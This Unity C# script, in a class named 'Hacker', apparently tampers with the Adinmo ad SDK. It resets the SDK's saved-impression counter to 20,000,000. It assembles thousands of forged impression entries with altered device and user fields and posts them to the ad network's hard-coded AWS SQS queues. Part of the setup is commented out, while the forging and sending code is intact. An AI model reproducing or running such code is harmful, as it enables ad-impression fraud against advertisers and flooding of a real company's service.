using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using Adinmo;
using System;
using System.Reflection;

public class Hacker : MonoBehaviour
{
    public string savedImpressionURL;
    public string settingsEcho = "{}";
    public string impressionEcho = "{}";
    public string m_commonImpressionInfo;
    public MethodInfo m_sendMethod;
    private UnityWebRequest m_wwwConfig;
    public AdinmoManager am;
    private AdinmoManager.UserInfo m_userInfo;
    public string m_gameKey;
    public string m_userInfoJson;
    protected List<AdinmoSampler.PlacementSamples> m_placements;

    // Start is called before the first frame update
    void Start()
    {
        //this.m_placements = new List<AdinmoSampler.PlacementSamples>();

        PlayerPrefs.SetInt("adinmo_db.v1.num_saved", 20000000);
        //this.m_userInfo.model = SystemInfo.deviceModel;
        //this.m_userInfo.type = SystemInfo.deviceType.ToString();
        //this.m_userInfo.os = SystemInfo.operatingSystem;
        //this.m_userInfo.uuid = AdinmoManager.GetAppUserId();
        //this.m_userInfo.name = SystemInfo.deviceName;
        //this.m_userInfo.game = this.m_gameKey;
        //this.m_userInfo.appid = Application.identifier;
        //this.m_userInfoJson = JsonUtility.ToJson((object)this.m_userInfo);

        //WWWForm wwwForm = new WWWForm();
        //wwwForm.AddField("version", 3);
        //wwwForm.AddField("user_info", m_userInfoJson);
        //wwwForm.AddField("device_id", "f1f4f7c8-404d-4d60-aa7e-7d378814b83e");
        //wwwForm.AddField("game_key", m_gameKey);
        //wwwForm.AddField("settings_echo", settingsEcho);
        //wwwForm.AddField("language", Application.systemLanguage.ToString());
        //wwwForm.AddField("appid", "com.SamarthCat.CatSlammers");
        //wwwForm.AddField("unity_version", Application.unityVersion);
        //wwwForm.AddField("build", "");
        //this.m_wwwConfig = UnityWebRequest.Post(AdinmoSender.s_settingsURL + "get_game_settings", wwwForm);
        //this.m_wwwConfig = UnityWebRequest.Post(AdinmoSender.s_settingsURL + "get_game_settings", wwwForm);
        //Type type = ((object)this.m_wwwConfig).GetType();
        //this.m_sendMethod = type.GetMethod("SendWebRequest");
        //savedImpressionURL = "https://sqs.us-east-1.amazonaws.com/651380694327/adinmo_sq_00?Version=2011-10-01&Action=SendMessage";
        //SaveImpressions(GetSendJson());
        //StartCoroutine(SendSavedImpressions());
    }

    public string GetSendJson()
    {
        string str1 = "";
        int num = 0;
        foreach (AdinmoSampler.PlacementSamples placement in this.m_placements)
        {
            print("yesyes");
            if (placement.ComputeViewInfo())
            {
                if (num == 0)
                    str1 = "{ ";
                string str2 = "p_" + num.ToString();
                str1 = str1 + "\"" + str2 + "\": " + JsonUtility.ToJson((object)placement.viewInfo) + ",";
                ++num;
            }
        }
        if (num > 0)
            str1 = str1 + "\"num_p\": " + num.ToString() + "}";
        print(str1);
        return str1;
    }


    IEnumerator SendSavedImpressions()
    {
        UnityWebRequest www = this.SendCommonImpression(this.savedImpressionURL, GetSavedImprssionJson());
        yield return this.m_sendMethod.Invoke((object)www, (object[])null);
        www.Dispose();
    }

    private UnityWebRequest SendCommonImpression(string url, string json)
    {
        print(json);
        WWWForm form = new WWWForm();
        this.CreateEndpointSpecificForm(form, this.GetCommonImpressionInfo(json));
        UnityWebRequest unityWebRequest = UnityWebRequest.Post(url, form);
        print(unityWebRequest);
        return unityWebRequest;
    }

    private string GetCommonImpressionInfo(string viewInfo)
    {
        bool flag = false;
        if (this.m_commonImpressionInfo == null)
            this.m_commonImpressionInfo = "{\"impression_echo\":" + impressionEcho + "," + AdinmoManager.GetJsonField("version", "3") + AdinmoManager.GetJsonField("user_info", AdinmoManager.s_manager.GetUserInfoJson()) + AdinmoManager.GetJsonField("device_id", AdinmoManager.GetAppUserId()) + AdinmoManager.GetJsonField("dev_env", flag ? "1" : "0");
        return this.m_commonImpressionInfo + (AdinmoManager.GetJsonField("view_info", viewInfo, true) + "}");
    }

    public string GetSavedImprssionJson()
    {
        string str1 = "{" + AdinmoManager.GetJsonField("num_saved", "20000");
        for (int n = 0; n < 20000; ++n)
        {
            string suffix = this.GetSuffix(n);
            string key1 = "when" + suffix;
            string val1 = PlayerPrefs.GetString(this.DecorateKey(key1), DateTime.UtcNow.ToString("yyyy-MM-ddTHH\\:mm\\:ss.fff"));
            string str2 = str1 + AdinmoManager.GetJsonField(key1, val1);
            string key2 = "payload" + suffix;
            print(key2);
            string val2 = PlayerPrefs.GetString(this.DecorateKey(key2), "");
            print("val2 = " + val2);
            str1 = str2 + GetJsonField(key2, val2, n == 20000 - 1);
        }
        string str3 = str1 + "}";
        return str3;
    }

    public static string GetJsonField(string key, string val, bool bLast = false)
    {
        string str = bLast ? "" : ",";
        return val[0] == '{' ? "\"" + key + "\":" + val + str : "\"" + key + "\":\"" + val + "\"" + str;
    }

    public void CreateEndpointSpecificForm(WWWForm form, string payload)
    {
        form.AddField("MessageBody", payload);
        form.AddField("Version", "2011-10-01");
        form.AddField("Action", "SendMessage");
    }

    private string GetSuffix(int n) => "_" + n.ToString();
    private string DecorateKey(string key) => "adinmo_db.v1." + key;


    public void SaveImpressions(string json)
    {
        if (true)
        {
            print("Saving Summary " + "20000" + json);
            string suffix = this.GetSuffix(20000);
            PlayerPrefs.SetInt(this.DecorateKey("num_saved"), 20000);
            PlayerPrefs.SetString(this.DecorateKey("when" + suffix), DateTime.UtcNow.ToString("yyyy-MM-ddTHH\\:mm\\:ss.fff"));
            PlayerPrefs.SetString(this.DecorateKey("payload" + suffix), json);
            PlayerPrefs.Save();
        }
    }


}

public class ServerConfig
{
    public float sendRate;
    public float sampleRate;
    public float sizeThreshold;
    public float recallProbability;
    public float maxDialogRate;
    public float cycleFrequency;
    public int timeout;
    public int minClientVersion;
    public int maxSavedSummaries;
    public int enableImageCache;
    public int enableImpressionCache;
    public int imageCacheMaxAge;
    public int imageCacheSize;
    public int isFilled;
    public string payloadKey;
    public string impressionURL;
    public string choiceURL;
    public string recallURL;
    public string savedImpressionURL;
    public string settingsEcho;
    public string impressionEcho;
    public string editorMsg;
    public string recallText;
    public string choiceText;

    public ServerConfig()
    {
        this.sendRate = 60f;
        this.sampleRate = 5f;
        this.minClientVersion = 3;
        this.maxSavedSummaries = 32;
        this.enableImageCache = 1;
        this.enableImpressionCache = 1;
        this.imageCacheMaxAge = 2592000;
        this.imageCacheSize = 5242880;
        this.sizeThreshold = 0.025f;
        this.timeout = 7;
        this.recallProbability = 0.5f;
        this.maxDialogRate = 15f;
        this.cycleFrequency = 0.0f;
        this.isFilled = 1;
        this.payloadKey = "MessageBody";
        this.impressionURL = "https://sqs.us-east-1.amazonaws.com/651380694327/adinmo_iq_00?Version=2011-10-01&Action=SendMessage";
        this.savedImpressionURL = "https://sqs.us-east-1.amazonaws.com/651380694327/adinmo_sq_00?Version=2011-10-01&Action=SendMessage";
        this.choiceURL = "https://sqs.us-east-1.amazonaws.com/651380694327/choice?Version=2011-10-01&Action=SendMessage";
        this.recallURL = "https://sqs.us-east-1.amazonaws.com/651380694327/recall?Version=2011-10-01&Action=SendMessage";
        this.settingsEcho = "{}";
        this.impressionEcho = "{}";
        this.editorMsg = "";
        this.recallText = "Which brand did you see?";
        this.choiceText = "Choose a Brand";
    }
}